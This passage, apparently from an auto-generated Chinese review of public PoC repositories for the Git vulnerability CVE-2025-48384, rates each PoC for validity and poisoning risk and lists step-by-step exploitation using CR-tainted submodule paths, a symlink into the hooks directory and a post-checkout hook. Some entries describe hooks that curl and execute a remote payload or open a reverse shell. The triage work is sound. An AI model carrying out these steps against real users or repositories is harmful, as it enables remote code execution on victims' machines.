CVE-2025-48384 漏洞源于 Git 在处理配置文件时，没有正确处理回车符 \r，导致在特定情况下（如初始化包含子模块的仓库时），子模块路径被错误解析。攻击者可以利用这一点，通过在子模块路径中注入恶意字符，配合精心构造的符号链接，将子模块检出到非预期位置，例如 Git 钩子目录。如果子模块包含恶意的 post-checkout 钩子脚本，则在检出后会被执行，从而实现任意代码执行。

**有效性评估：**
根据漏洞信息和搜索结果，此漏洞的利用需要满足一定条件，即需要用户 clone 包含恶意子模块配置的仓库或者提交包含恶意配置的patch。提供的 POC 代码 `/tmp/8746716955bead91920f029f2728e38d/README.md` 仅仅是一个 README 文件，本身不具备任何攻击性，因此不能直接作为有效的 POC。

**投毒风险评估：**
提供的 POC 代码只是一个简单的 README 文件，没有任何可执行代码，因此不存在直接的投毒风险。投毒行为可能存在于更复杂的攻击场景中，比如在精心构造的恶意 Git 仓库中，但仅凭这个 README 文件无法评估其风险。

**利用方式：**
1.  攻击者创建一个包含恶意子模块配置的 Git 仓库，子模块的路径包含回车符 \r。
2.  攻击者创建一个符号链接，将修改后的子模块路径指向 Git 钩子目录（.git/hooks）。
3.  攻击者在子模块中包含一个恶意的 post-checkout 钩子脚本。
4.  受害者 clone 该恶意仓库，Git 初始化子模块时，由于回车符处理不当，子模块被检出到错误的钩子目录。
5.  检出完成后，恶意的 post-checkout 钩子脚本被执行，攻击者从而实现任意代码执行。

**项目地址:** [elprogramadorgt/CVE-2025-48384](https://github.com/elprogramadorgt/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #17

**来源**: [CVE-2025-48384-fishyyh_CVE-2025-48384.md](../2025/CVE-2025-48384-fishyyh_CVE-2025-48384.md)

## CVE-2025-48384 Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。用户需要使用受影响的Git版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，未正确处理和转义回车符（CR）。当 Git 读取配置值时，会删除任何尾部的 CRLF。当写入配置条目时，带有尾部 CR 的值不会被引用，导致配置稍后读取时 CR 丢失。当初始化子模块时，如果子模块路径包含尾部 CR，更改后的路径将被读取，导致子模块被检出到错误的位置。如果存在符号链接将更改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**
提供的POC代码 `/tmp/60afff46543494eb5516e8104e00d576/README.md` 仅包含一个README文件，其内容是关于 CVE-2025-48384 的简单描述。这个文件本身并没有利用漏洞的能力。根据漏洞描述，真正的PoC 需要包含一个具有特定结构的 Git 仓库，包括带尾部CR的子模块路径以及指向钩子目录的符号链接，以及一个恶意的 post-checkout 钩子。因此，仅凭提供的README.md文件无法验证漏洞的有效性，需要进一步的Payload和利用步骤。

**投毒风险：**
提供的POC代码仅为一个README.md文件，不包含任何可执行代码或恶意脚本，因此可以认为投毒风险较低，约为10%。但需要注意，实际的漏洞利用可能涉及其他文件和步骤，不能完全排除恶意代码存在的可能性。

**利用方式：**
1.  **创建恶意仓库：** 创建一个 Git 仓库，其中包含一个子模块。
2.  **构造恶意配置：** 在`.gitmodules`文件中，子模块的路径包含尾部回车符（CR）。例如：`path = submodule_path\r`
3.  **创建符号链接：** 创建一个符号链接，将由于回车符导致错误解析后的子模块路径，指向`.git/modules/<submodule_name>/hooks`目录。
4.  **添加恶意钩子：** 在子模块的`.git/hooks/post-checkout`中添加可执行的恶意脚本。
5.  **诱导用户克隆：** 诱导用户克隆包含恶意配置的仓库。当用户克隆或更新子模块时，由于配置解析错误和符号链接的存在，恶意的 post-checkout 钩子将被执行，从而实现任意代码执行。

**排序优先级说明:**
尽管搜索引擎结果提供了有关漏洞的更多上下文信息，但漏洞库信息提供了最直接的漏洞描述和受影响的版本。POC代码本身不包含利用逻辑，因此优先级最低。综合考虑，应该优先关注漏洞库信息和搜索引擎结果，并结合实际的利用场景进行分析。

**项目地址:** [fishyyh/CVE-2025-48384](https://github.com/fishyyh/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #18

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置文件时对回车符（CR）处理不当，允许通过精心构造的仓库配置执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞允许攻击者通过在 submodule 路径中注入包含回车符的恶意配置，导致 submodule 被检出到错误的位置。如果该错误位置存在指向 submodule hooks 目录的符号链接，且 submodule 包含可执行的 post-checkout 钩子，则该钩子会被意外执行，从而实现任意代码执行。

提供的POC代码是一个简单的 post-checkout 钩子脚本，它会在检出后显示一个banner。这个脚本本身没有问题，证明了漏洞利用的可行性。漏洞利用的核心在于精心构造包含恶意回车符的仓库配置和符号链接。

**投毒风险：**
提供的POC代码（/tmp/77b6aa1852eafe71ccbdb092fa3f1fb6/post-checkout）本身只是一个banner打印脚本，其目的是验证漏洞利用后可以执行任意代码，本身不具备投毒行为。但是，需要注意的是，如果攻击者控制了整个包含该POC代码的Git仓库，那么他们可以在仓库的其他位置添加恶意代码，从而实现投毒。基于当前信息，POC本身不具备投毒性，投毒的可能性为0%。

**利用方式：**
1.  攻击者创建一个恶意的Git仓库，其中包含一个带有回车符的submodule路径的.gitmodules文件。例如，submodule的路径可能是 "submodule\r"。
2.  攻击者创建一个符号链接，将 "submodule" 指向".git/modules/<submodule-name>/hooks"目录，这个目录包含git hooks。
3.  攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将这个恶意仓库分享给受害者。
5.  受害者克隆这个仓库。由于Git对回车符处理不当，submodule会被检出到错误的位置（即符号链接指向的hooks目录）。
6.  当 submodule 完成检出时，post-checkout 钩子脚本会被执行，从而导致恶意代码执行。

**项目地址:** [fluoworite/CVE-2025-48384-sub](https://github.com/fluoworite/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #19

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384.md)

## CVE-2025-48384

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互 (克隆包含恶意配置的仓库)

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-48384 漏洞是 Git 中由于对配置项中回车符处理不当导致的代码执行漏洞。当 Git 读取配置值时，会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，带有尾部 CR 的值不会被引用，导致 CR 在以后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部 CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致代码执行。

**有效性：**
根据漏洞库信息和搜索结果, 此漏洞确实存在并且被多个安全厂商标记为高危, 并已经发布了PoC.
提供的PoC代码看似简单，它展示了漏洞利用的核心思路，即通过恶意构造包含回车符的子模块路径，结合符号链接和子模块钩子，实现任意代码执行。因此，PoC代码在原理上是有效的。但是, 此PoC只是框架, 需要补充完成exp。

**投毒风险：**
提供的PoC代码较为简单，主要包含一个README.md文件，一个子模块配置路径，以及子模块hooks目录的占位符。直接分析来看，没有明显的投毒代码。
然而，考虑到攻击者可能利用该漏洞进行供应链攻击，在更复杂的场景下，攻击者可能在子模块的post-checkout钩子中植入恶意代码，或者在其他配置文件中隐藏恶意配置。这种可能性是存在的。
基于以上分析，投毒风险评估为20%。这个百分比表示存在一定的风险，但直接证据不足。

**利用方式：**
1.  **恶意仓库构造：** 攻击者创建一个 Git 仓库，其中包含一个子模块，并且该子模块的路径在 `.gitmodules` 文件中包含尾部回车符 (`
`)。
2.  **符号链接创建：** 攻击者在仓库中创建一个符号链接，将包含尾部回车符的子模块路径指向 `.git/modules/<submodule_name>/hooks` 目录。
3.  **恶意钩子植入：** 攻击者在子模块的 `.git/hooks/post-checkout` 目录中放置恶意脚本。
4.  **用户交互：** 诱使用户克隆恶意仓库并初始化子模块 (`git submodule init && git submodule update`)。
5.  **代码执行：** 当用户执行 `git submodule update` 命令时，由于路径中的回车符，子模块会被检出到错误的位置，但由于符号链接的存在，实际上会将子模块的 hooks 目录链接到 `.git/hooks` 目录。检出后，`post-checkout` 钩子会被执行，从而执行恶意代码。

**项目地址:** [fluoworite/CVE-2025-48384](https://github.com/fluoworite/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #20

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md)

## CVE-2025-48384 Git config quoting vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置条目时，带有尾部CR的值不会被引用，导致CR在稍后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则该脚本可能在检出后被意外执行，从而导致任意代码执行。

根据提供的漏洞利用代码，包含一个Exploit脚本和一个README.md文件。Exploit脚本只打印了一段ASCII艺术，并没有任何实际的漏洞利用代码。因此，提供的POC代码**本身**是无效的，仅仅是一个占位符。但漏洞本身是存在的，并且有公开的PoC。

由于提供的POC代码仅仅是ASCII艺术，没有任何恶意代码，因此**不存在投毒风险**。投毒风险概率为0%。

**漏洞利用方式：**

1.  攻击者创建一个恶意的Git仓库，该仓库包含一个子模块。
2.  子模块的路径包含一个尾部CR字符。
3.  仓库中包含一个符号链接，该符号链接将子模块路径指向子模块的hooks目录。
4.  子模块包含一个可执行的post-checkout hook脚本。
5.  受害者克隆该恶意仓库。
6.  Git在处理子模块时，由于CR字符被删除，子模块被检出到错误的位置，并执行了post-checkout hook脚本。
7.  攻击者可以通过post-checkout hook脚本执行任意代码。

**项目地址:** [fluoworite/CVE-2025-48384_sub](https://github.com/fluoworite/CVE-2025-48384_sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #21

**来源**: [CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Arbitrary Code Execution

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，且递归初始化子模块 (--recursive)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，由于 Git 在读取和写入包含控制字符的配置值时存在不一致性导致。具体来说，当写入配置条目时，如果值包含尾随回车符 (CR)，则不会被引用，导致稍后读取配置时丢失 CR。当初始化子模块时，如果子模块路径包含尾随 CR，则读取的路径将被更改，从而导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符 (CR)。
2.  攻击者在该仓库的子模块钩子目录中放置一个恶意的 post-checkout 脚本。
3.  攻击者诱使用户克隆该仓库，并使用 `--recursive` 选项初始化子模块。
4.  由于 Git 处理 CR 的方式不一致，子模块将被检出到错误的位置。该位置由一个符号链接指向子模块的钩子目录。
5.  当子模块被检出时，post-checkout 脚本将被执行，从而允许攻击者在用户的系统上执行任意代码。

**POC 代码分析：**

*   `/tmp/602a5075317553582468533486cbdb4d/README.md`：这是一个简单的 README 文件，用于描述漏洞利用。不包含恶意代码。
*   `/tmp/602a5075317553582468533486cbdb4d/post-checkout`：这是一个 shell 脚本，会在用户的主目录下创建一个名为 `hacked` 的文件。这表明该 POC 旨在演示任意代码执行。

**有效性：**

提供的 POC 代码是有效的。它可以触发漏洞，并在目标系统上执行任意代码（在本例中，创建一个文件）。

**投毒风险：**

根据提供的 POC 代码，没有发现明显的投毒代码。该脚本仅用于演示漏洞利用，没有执行任何额外的恶意操作，例如收集用户信息或传播恶意软件。因此，投毒风险为 0%。

**项目地址:** [jacobholtz/CVE-2025-48384-submodule](https://github.com/jacobholtz/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #22

**来源**: [CVE-2025-48384-kallydev_cve-2025-48384-hook.md](../2025/CVE-2025-48384-kallydev_cve-2025-48384-hook.md)

## CVE-2025-48384-Git任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 描述了 Git 中由于配置引用解析错误导致的任意代码执行漏洞。当 Git 读取配置值时，会去除末尾的回车符和换行符。当写入配置项时，带有末尾回车符的值不会被引用，导致回车符丢失。在初始化子模块时，如果子模块路径包含末尾回车符，则读取的路径会被更改，导致子模块检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 `post-checkout` 钩子脚本，用于打开一个网页 `https://github.com/kallydev`。利用方式是通过精心构造的子模块路径和符号链接，使得该脚本在 `git checkout` 操作后被执行。该POC代码有效，能够触发任意代码执行。

**投毒风险：**

该POC代码本身比较简单，只是打开一个网页，**不存在明显的恶意投毒代码**。因此，投毒风险较低，为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`文件的仓库，该文件中的子模块路径包含尾部回车符(
)。
2.  攻击者在仓库中创建一个符号链接，指向子模块目录下的 `.git/modules/<子模块名>/hooks` 目录，如 `evil_link -> .git/modules/<子模块名>/hooks/post-checkout`。
3.  攻击者在子模块中创建一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该仓库并初始化子模块 (`git submodule init` 和 `git submodule update`)。
5.  当受害者执行 `git checkout` 命令时，由于子模块路径包含尾部回车符，Git 会将子模块检出到错误的位置。由于符号链接的存在，`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**项目地址:** [kallydev/cve-2025-48384-hook](https://github.com/kallydev/cve-2025-48384-hook)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #23

**来源**: [CVE-2025-48384-liamg_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-liamg_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Config 注入 RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码注入/命令执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户进行`git clone --recursive`操作

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞是 Git 中的一个代码注入漏洞，源于 Git 在处理 config 文件时，没有正确处理carriage return (
)字符。攻击者可以通过在 submodule 的路径中注入 \r 字符，使得 submodule 被检出到错误的位置。如果精心构造一个 symlink 链接到 submodule 钩子目录，并使 submodule 包含一个可执行的 post-checkout 钩子，那么这个钩子脚本就会在检出后被执行，从而实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞已经公开，并且存在可利用的POC代码。从github搜索结果[webpage 6 begin]和[webpage 7 begin]可以知道，已经有开发者提供了复现代码。提供的POC代码包含两个文件：`README.md` 和 `post-checkout`。
  *   `README.md` 文件指向了GitHub的POC地址，说明这是一个漏洞验证示例。
  *   `post-checkout` 文件包含 `echo "Uh-oh, this is an RCE!"`，这是一个简单的命令执行示例，用于验证漏洞是否成功利用。
因此，提供的POC代码是有效的，可以用来验证此漏洞。

**投毒风险分析：**

提供的 POC 代码非常简单，只包含一个输出字符串的命令。**没有发现任何隐藏的、恶意的代码**，因此投毒风险较低。可以认为投毒风险为0%。虽然这是一个 RCE 漏洞的验证代码，在真实场景下，`post-checkout` 脚本会包含更复杂的恶意代码，但这不属于仓库投毒的范畴，POC 本身是为了验证漏洞的存在，而不是进行恶意攻击。

**利用方式：**

1.  **构造恶意的Git仓库：** 攻击者需要创建一个包含恶意配置的Git仓库，其中 submodule 的路径包含 \r 字符。
2.  **创建Symlink：** 在仓库中创建一个符号链接，将带有 \r 字符的路径链接到 `.git/modules/<submodule>/hooks` 目录。
3.  **添加恶意钩子：** 在 submodule 中创建一个可执行的 `post-checkout` 钩子脚本，这个脚本包含攻击者想要执行的任意代码。
4.  **诱导用户克隆仓库：** 攻击者需要诱导受害者执行 `git clone --recursive <malicious_repo>` 命令。
5.  **触发漏洞：** 当用户执行 `git clone --recursive` 命令时，Git 会读取恶意的配置，将 submodule 检出到错误的位置，并且由于 symlink 的存在，触发执行 `post-checkout` 钩子脚本，从而执行攻击者的代码。


**项目地址:** [liamg/CVE-2025-48384-submodule](https://github.com/liamg/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #24

**来源**: [CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md](../2025/CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户执行恶意Git操作（例如，克隆包含恶意配置的仓库或初始化包含恶意配置的子模块）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，允许通过畸形的配置引用执行任意代码。漏洞的根本原因是Git在处理配置文件中的换行符时存在缺陷。具体来说，当Git写入配置条目时，如果值包含尾部的回车符（CR），则不会被正确引用。当后续读取配置时，尾部的CR会被删除，导致配置路径发生变化。

**利用方式：**

1.  攻击者创建一个包含恶意的`.gitmodules`文件的仓库。在这个文件中，子模块的路径包含一个尾部的回车符。
2.  攻击者设置一个符号链接，将经过修改的（尾部回车符被删除）子模块路径指向`.git/hooks`目录。
3.  攻击者在子模块中放置一个可执行的`post-checkout`钩子。
4.  受害者克隆该仓库并初始化子模块。
5.  当子模块初始化时，由于路径的更改以及符号链接的存在，`post-checkout`钩子会被执行，从而导致任意代码执行。

**POC有效性：**

提供的POC代码是一个`post-checkout`钩子脚本，它会尝试通过`curl`命令从`https://jarvis.webhop.me/pwned`下载并执行内容。这个脚本本身就是漏洞利用的一部分，当上述步骤成功执行时，该脚本将被执行，从而实现远程代码执行。

**投毒风险：**

提供的POC代码本身旨在利用该漏洞，因此不应将其视为潜在的投毒代码。然而，攻击者可以利用此漏洞传播恶意软件或执行其他恶意活动。此处的0%表示该代码片段本身没有隐藏其他恶意逻辑，它仅仅是利用该漏洞实现代码执行的载体。


**项目地址:** [mukesh-610/cve-2025-48384-exploit](https://github.com/mukesh-610/cve-2025-48384-exploit)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #25

**来源**: [CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md](../2025/CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md)

## CVE-2025-48384-Git配置引用导致的任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并使用 `--recurse-submodules` 参数初始化子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 在处理配置文件中的引号时不正确，特别是当子模块路径包含尾随回车符（CR）时。攻击者可以利用此漏洞通过创建包含恶意子模块配置的 Git 仓库，诱使用户克隆该仓库，并通过 `--recurse-submodules` 初始化子模块，从而导致任意代码执行。

**有效性分析：**

提供的 PoC 代码通过以下步骤利用该漏洞：

1.  创建一个包含恶意 hook 的 `evil` 目录，该 hook 会执行反向 shell。
2.  创建一个 `mainrepo` 目录，作为主仓库。
3.  在 `mainrepo` 目录中，创建一个 `.gitmodules` 文件，其中包含一个子模块定义，该子模块的路径包含尾随回车符 (`evil\r`)。
4.  创建一个符号链接，将 `evil
/hooks` 指向 `../evil/.git/hooks`，从而将恶意 hook 链接到子模块的 hooks 目录。
5.  将恶意子模块添加到仓库，并提交更改。
6.  通过 `git clone --recurse-submodules` 克隆 `mainrepo` 仓库，触发子模块初始化，从而执行恶意 hook。

根据 PoC 代码的逻辑和漏洞描述，该 PoC 代码是有效的。

**投毒风险分析：**

PoC 代码的目的是演示漏洞利用，其中包含的反向 shell 属于漏洞验证的一部分。但是，也存在潜在的投毒风险，比如在 `generate_poc.sh` 脚本中，作者可能会嵌入其他恶意代码，例如：

*   收集用户信息并发送到远程服务器。
*   修改系统文件。
*   安装恶意软件。

尽管PoC本身就是漏洞利用，但仍然存在被作者恶意利用的可能性，因此投毒风险评估为 10%。

**利用方式总结：**

1.  攻击者创建一个包含恶意子模块配置的 Git 仓库。
2.  攻击者诱使受害者克隆该仓库，并使用 `--recurse-submodules` 初始化子模块。
3.  Git 在处理包含尾随回车符的子模块路径时出现错误，导致子模块被检出到错误的位置。
4.  由于符号链接的存在，恶意 hook 被链接到子模块的 hooks 目录。
5.  在子模块初始化过程中，恶意 hook 被执行，导致任意代码执行。

**项目地址:** [nguyentranbaotran/cve-2025-48384-poc](https://github.com/nguyentranbaotran/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #26

**来源**: [CVE-2025-48384-replicatorbot_CVE-2025-48384.md](../2025/CVE-2025-48384-replicatorbot_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户检出包含恶意配置和submodule的仓库，且submodule包含恶意的post-checkout hook

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造包含恶意配置的Git仓库，实现在目标机器上执行任意代码。漏洞的根本原因是Git在处理配置文件中的换行符（CRLF）时存在缺陷。当Git读取配置值时，会去除尾部的CRLF，而当写入配置项时，如果值包含尾部CR，则不会进行引用，导致CR丢失。该漏洞利用方式如下：

1.  攻击者创建一个包含恶意配置的Git仓库，该配置会在submodule的路径中包含一个尾部的CR字符。
2.  攻击者创建一个submodule，并在submodule的`.git/hooks/post-checkout`文件中放置恶意脚本。
3.  攻击者创建一个指向恶意脚本的符号链接，该链接的目标路径经过CR处理后，会指向submodule的hooks目录。
4.  用户克隆包含恶意配置的仓库，并且递归初始化submodule，触发post-checkout钩子，执行恶意脚本，从而导致任意代码执行。

提供的POC代码是一个简单的`post-checkout`钩子脚本，它会在`/tmp`目录下创建一个名为`asp-was-here-cve-2025-48384`的文件。该脚本本身没有隐藏的投毒代码，只是用于验证漏洞是否成功利用。

根据搜索引擎的结果，该漏洞是真实存在的，并且有公开的PoC利用代码。多个安全厂商和社区都对此漏洞进行了分析和披露。

综合以上信息，可以得出结论：该漏洞利用是有效的，POC代码本身没有投毒风险，漏洞的利用方式是通过构造包含恶意配置和submodule的仓库，诱导用户克隆并初始化submodule，从而执行任意代码。

**项目地址:** [replicatorbot/CVE-2025-48384](https://github.com/replicatorbot/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #27

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git允许通过损坏的配置引用执行任意代码

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户克隆包含恶意配置的 Git 仓库，并递归初始化子模块。用户需要具有一定的权限，并且需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理包含回车符（CR）的配置值时存在不一致性。当读取配置值时，Git 会删除尾部的 CRLF。但是，当写入配置条目时，如果值包含尾部的 CR，则不会被正确引用，导致在后续读取配置时丢失 CR。当初始化子模块时，如果子模块的路径包含尾部的 CR，则修改后的路径将被读取，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
